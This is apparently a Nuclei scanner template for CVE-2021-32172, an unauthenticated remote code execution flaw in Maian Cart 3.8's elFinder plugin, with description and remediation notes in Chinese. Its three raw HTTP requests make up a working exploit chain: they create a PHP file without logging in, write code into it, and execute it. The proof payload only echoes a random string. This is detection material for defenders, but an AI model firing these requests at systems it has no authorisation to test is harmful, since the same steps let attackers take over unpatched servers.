id: CVE-2021-32172
info:
  name: Maian Cart <=3.8 - Remote Code Execution
  author:
  - pdteam
  tags:
  - cve
  - cve2021
  - rce
  - unauth
  - maian
  description: |-
    Maian Cart v3.8存在远程代码执行漏洞
    Maian Script World Maian Cart是英国Maian Script World公司的一个功能强大的电子商务系统。

    Maian Cart v3.8 存在安全漏洞，该漏洞源于Elfinder插件中的访问控制问题。
  reference:
  - https://dreyand.github.io/maian-cart-rce/
  - https://github.com/dreyand/maian-cart-rce
  - https://www.maianscriptworld.co.uk/critical-updates
  - https://nvd.nist.gov/vuln/detail/cve-2021-32172
  severity: critical
  classification:
    cve-id:
    - cve-2021-32172
    cwe-id:
    - cwe-862
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.maianscriptworld.co.uk/
    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body_3, "{{randstr_1}}")
    - status_code_3 == 200
  extractors:
  - name: hash
    type: regex
    regex:
    - '"hash"\:"(.*?)"\,'
    group: 1
    internal: true
  raw:
  - |
    GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  - |
    POST /admin/index.php?p=ajax-ops&op=elfinder HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, /; q=0.01
    Accept-Language: en-US,en;q=0.5
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    cmd=put&target={{hash}}&content=%3c%3fphp%20echo%20%22{{randstr_1}}%22%3b%20%3f%3e
  - |
    GET /product-downloads/{{randstr}}.php HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  req-condition: true
